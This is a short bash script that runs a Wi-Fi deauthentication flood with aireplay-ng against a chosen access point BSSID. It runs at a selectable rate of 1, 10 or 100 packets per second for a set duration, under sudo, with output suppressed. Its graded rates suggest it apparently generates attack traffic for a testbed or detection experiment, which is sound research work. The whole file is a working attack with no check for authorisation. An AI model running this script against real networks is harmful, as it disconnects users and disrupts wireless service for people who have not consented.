#!/usr/bin/env bash
# Attacker deauth at a controlled rate for a duration.
# usage: attack.sh <low|moderate|high> <duration_sec> <bssid> <iface>
set -euo pipefail
RATE="$1"; DUR="$2"; BSSID="$3"; IFACE="$4"
case "$RATE" in
  low) PPS=1 ;; moderate) PPS=10 ;; high) PPS=100 ;;
  *) echo "bad rate: $RATE"; exit 1 ;;
esac
sudo timeout "$DUR" aireplay-ng --deauth 0 -x "$PPS" -a "$BSSID" --ignore-negative-one "$IFACE" >/dev/null 2>&1 || true
